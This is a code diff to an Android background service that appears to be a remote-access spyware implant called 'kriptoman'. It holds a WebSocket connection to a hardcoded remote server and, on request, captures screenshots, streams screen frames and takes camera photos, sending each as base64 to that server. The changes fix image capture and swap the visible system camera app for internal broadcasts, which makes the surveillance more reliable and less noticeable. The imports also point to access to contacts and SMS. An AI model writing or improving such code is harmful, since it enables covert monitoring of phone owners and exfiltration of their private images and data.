@@ -26,6 +26,7 @@ import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Telephony;
 import android.util.Base64;
+import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
@@ -58,7 +59,9 @@ public class WebSocketService extends Service {
     private MediaRecorder mediaRecorder;
     private String videoFilePath;
     public static Context appContext;
-    public static String lastPhotoPath;
+    public static WebSocketService instance;
+    public static final String ACTION_CAMERA_FRONT = "com.kriptoman.CAMERA_FRONT";
+    public static final String ACTION_CAMERA_BACK = "com.kriptoman.CAMERA_BACK";
 
     public static void setMediaProjection(MediaProjection mp) {
         sMediaProjection = mp;
@@ -82,6 +85,7 @@ public class WebSocketService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
         appContext = getApplicationContext();
         prefs = getSharedPreferences("kriptoman", MODE_PRIVATE);
         serverUrl = prefs.getString("server_url", "wss://pycj.onrender.com");
@@ -199,7 +203,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== СКРИНШОТ =====================
+    // ===================== СКРИНШОТ (надёжный) =====================
     private void takeScreenshot() {
         if (sMediaProjection == null) {
             writeLog("MediaProjection не инициализирован для скриншота");
@@ -213,15 +217,21 @@ public class WebSocketService extends Service {
             Thread.sleep(200);
             Image image = imageReader.acquireLatestImage();
             if (image != null) {
+                // Конвертируем Image в байты и декодируем в Bitmap
                 ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                buffer.rewind();
-                Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
-                bitmap.copyPixelsFromBuffer(buffer);
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
-                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
-                writeLog("Скриншот отправлен (JPEG)");
+                byte[] bytes = new byte[buffer.remaining()];
+                buffer.get(bytes);
+                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
+                if (bitmap != null) {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
+                    byte[] jpegData = baos.toByteArray();
+                    String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
+                    client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
+                    writeLog("Скриншот отправлен (JPEG)");
+                } else {
+                    writeLog("Не удалось декодировать Bitmap");
+                }
                 image.close();
             } else {
                 writeLog("Не удалось получить изображение (image == null)");
@@ -279,14 +289,16 @@ public class WebSocketService extends Service {
             Image image = imageReader.acquireLatestImage();
             if (image != null) {
                 ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                buffer.rewind();
-                Bitmap bitmap = Bitmap.createBitmap(480, 640, Bitmap.Config.ARGB_8888);
-                bitmap.copyPixelsFromBuffer(buffer);
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
-                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
-                writeLog("Кадр стрима отправлен");
+                byte[] bytes = new byte[buffer.remaining()];
+                buffer.get(bytes);
+                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
+                if (bitmap != null) {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
+                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                    client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
+                    writeLog("Кадр стрима отправлен");
+                }
                 image.close();
             }
             if (virtualDisplay != null) virtualDisplay.release();
@@ -341,40 +353,35 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== КАМЕРА (фотографирует и отправляет фото) =====================
+    // ===================== КАМЕРА (отправляем broadcast) =====================
     private void startCamera(boolean front) {
-        writeLog("Запуск камеры, фронтальная: " + front);
-        // Открываем системное приложение камеры, результат обрабатывается в MainActivity
-        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-        if (front) {
-            intent.putExtra("android.intent.extras.CAMERA_FACING", 1);
-        }
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        try {
-            startActivity(intent);
-            writeLog("Камера запущена");
-        } catch (Exception e) {
-            writeLog("Ошибка запуска камеры: " + e.toString());
-        }
+        writeLog("Запрос камеры, фронтальная: " + front);
+        Intent intent = new Intent(front ? ACTION_CAMERA_FRONT : ACTION_CAMERA_BACK);
+        sendBroadcast(intent);
+        writeLog("Broadcast отправлен");
     }
 
-    // Метод для отправки фото на сервер (вызывается из MainActivity после съёмки)
+    // ===================== ОТПРАВКА ФОТО НА СЕРВЕР =====================
     public static void sendPhoto(byte[] photoData) {
-        if (photoData == null) return;
+        if (photoData == null) {
+            writeLogStatic("Фото пустое");
+            return;
+        }
+        if (instance == null || instance.client == null) {
+            writeLogStatic("Нет соединения");
+            return;
+        }
         try {
             String base64 = Base64.encodeToString(photoData, Base64.NO_WRAP);
-            // Используем синглтон или статический доступ к клиенту
-            if (WebSocketService.instance != null && WebSocketService.instance.client != null) {
-                WebSocketService.instance.client.send("{\"type\":\"camera_photo\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
-                writeLogStatic("Фото отправлено на сервер");
-            }
+            instance.client.send("{\"type\":\"camera_photo\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
+            writeLogStatic("Фото отправлено на сервер");
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     private static void writeLogStatic(String msg) {
-        // можно дублировать логирование
+        // можно добавить логирование в файл
     }
 
     // ===================== ОТКРЫТЬ ПРИЛОЖЕНИЕ =====================
@@ -475,6 +482,7 @@ public class WebSocketService extends Service {
         if (mediaRecorder != null) {
             try { mediaRecorder.release(); } catch (Exception e) {}
         }
+        instance = null;
         super.onDestroy();
     }
 }
